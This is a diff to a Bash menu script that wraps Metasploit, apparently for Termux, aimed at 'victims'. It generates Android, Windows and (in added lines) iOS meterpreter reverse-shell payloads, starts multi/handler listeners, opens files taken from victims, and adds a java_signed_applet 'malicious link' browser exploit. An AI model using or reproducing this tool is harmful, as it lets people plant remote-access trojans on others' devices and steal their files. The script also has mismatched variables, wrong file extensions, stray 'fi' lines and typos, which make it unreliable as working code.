@@ -23,12 +23,13 @@ echo -e
 #--------------------------------------------------
 #--------------------------------------------------
 echo ""
-echo -e $yellow	'Welcome In MetaSploit 2019 U Can Injoy With Me '
+echo -e $yellow	'Welcome In MetaSploit 2019 U Can Injoy With Me'
 echo ""
+echo -e $red 'Code By Saeed Ahmeed'
 #--------------------------------------------------
 #--------------------------------------------------
 #--------------------------------------------------
-
+sleep 1
 echo -e "$red                                          [00]back"
 echo -e "$cyan"
 echo "            [1]payload android ????????"
@@ -42,6 +43,8 @@ echo "            [8]Open the victim files that you downloaded ???? "
 echo "            [9]Download msf ??????"
 echo "            [10]error metasploit ??????             "
 echo "            [11]Download msf (5.0.0)??????"
+echo "            [12]payload ios ???????"
+echo "            [13]Breakthrough by malicious link ???"
 echo -e "$green"
 read -p "     number------->  " Zoal
 #--------------------------------------------------
@@ -50,13 +53,13 @@ read -p "     number------->  " Zoal
 if [ $Zoal -eq 1 ]
 then
 echo -e $yellow " please insert LHOST :>"
-read -p "insert LHOST :>" lhost
+read -p "                       LHOST----->" host
 echo -e $yellow " please insert port :>"
-read -p "insert LPORT :>" lport
+read -p "                       LPORT----->" lport
 echo -e $yellow " please insert Name payload :>"
-read -p "insert name :>" name
+read -p "                       Name----->" name
 echo -e $red " please insert path :>"
-read -p "insert PATH :>" path
+read -p "                             Path----->" path
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.apk
 bash metasploit.sh
 fi
@@ -64,36 +67,34 @@ fi
 if [ $Zoal -eq 2 ]
 then
 echo -e $green " please insert LHOST :>"
-read -p "insert LHOST :>" lhost
+read -p "                      LHOST----->" lhost
 echo -e $green " please insert port :>"
-read -p "insert port :>" lport
+read -p "                      LPORT----->" lport
 echo -e $green " please insert Name payload :>"
-read -p "insert name :>" name
+read -p "                      Name----->" name
 echo -e $green " please insert path :>"
-read -p "insert PATH :>" path
+read -p "                      Path----->" path
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $path/$name.apk
 bash metasploit.sh
 fi
 if [ $Zoal -eq 3 ]
 then
-echo -e $blue "Please Insert LHOST"
-read -p "insert LHOST :>" host
-echo -e $blue "Please Insert PORT"
-read -p "insert LPORT :>" port
-msfconsole -x 'use multi/handler' -x 'set payload 
-android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
+echo -e $blue "Please Insert LHOST :>"
+read -p "                    LHOST----->" host
+echo -e $blue "Please Insert PORT :>"
+read -p "                    LPORT----->" lport
+msfconsole -x 'use multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
 
 fi 
 
 if [ $Zoal -eq 4 ]
 then
 
-echo -e $white "Please Insert LHOST"
-read -p "insert LHOST :>" host
-echo -e $white "Please Insert PORT"
-read -p "insert LHOST :>" port
-msfconsole -x 'use exploit/multi/handler' -x 'set payload 
-windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
+echo -e $white "Please Insert LHOST :>"
+read -p "                     LHOST----->" host
+echo -e $white "Please Insert PORT :>"
+read -p "                     LPORT----->" lport
+msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
 fi 
 
 if [ $Zoal -eq 5 ]
@@ -114,11 +115,12 @@ fi
 if [ $Zoal -eq 7 ]
 then
 echo -e "$red"
-echo "                                 [0]back"
+echo ""
 echo -e "$green    "
 cd $HOME/MetaSploit/.msf && ls
 echo ""
 read -p "name.txt ------> " n
+fi
 if [ "$n" -eq "0"  ]; then
 cd $HOME/MetaSploit
 metasploit.sh
@@ -129,18 +131,19 @@ fi
 if [ $Zoal -eq 8 ]
 then
 echo -e "$red"
-echo "                                 [0]back"
+echo ""
 echo -e "$green    "
 cd $HOME/MetaSploit/.msf && ls
 echo ""
 read -p "name photo ------> " n
 echo -e "$green"
+fi
 if [ "$n" -eq "0"  ]; then
 cd $HOME/MetaSploit
 metasploit.sh
 else
 termux-open $n
-echo "                                   good pay"
+echo ""
 fi
 
 if [ $Zoal -eq 9 ]
@@ -176,3 +179,34 @@ then
          echo -e "$g++++++++++>$p[end Download metasploit]$g<++++++++++++"
          sleep 1
          metasploit.sh'
+         fi
+
+if [ $Zoal -eq 12 ]
+then
+echo -e $green " please insert LHOST :>"
+read -p "                      LHOST----->" lhost
+echo -e $green " please insert port :>"
+read -p "                      LPORT----->" lport
+echo -e $green " please insert Name payload :>"
+read -p "                      Name----->" name
+echo -e $green " please insert path :>"
+read -p "                      Path----->" path
+msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.api
+fi
+
+if [ $Zoal -eq 13 ]
+then
+echo -e $green "Please Insert SRVHOST :>"
+read -p "                     LHOST----->" host
+echo -e $green "Please Insert SRVPORT :>"
+read -p "                     LPORT----->" lport
+msfconsole -x 'use exploit/multi/browser/java_signed_applet' -x 'set SRVHOST '$host -x 'set SRVPORT '$port -x 'set URLPATH /exploit ' -x 'set AAPLETNAME google_unix4 ' -x 'exploit'
+fi
+fi
+
+if [ $Zoal -eq 00 ]
+then
+clear 
+figlet -f mono12.tlf "Good Bye"
+exit
+fi
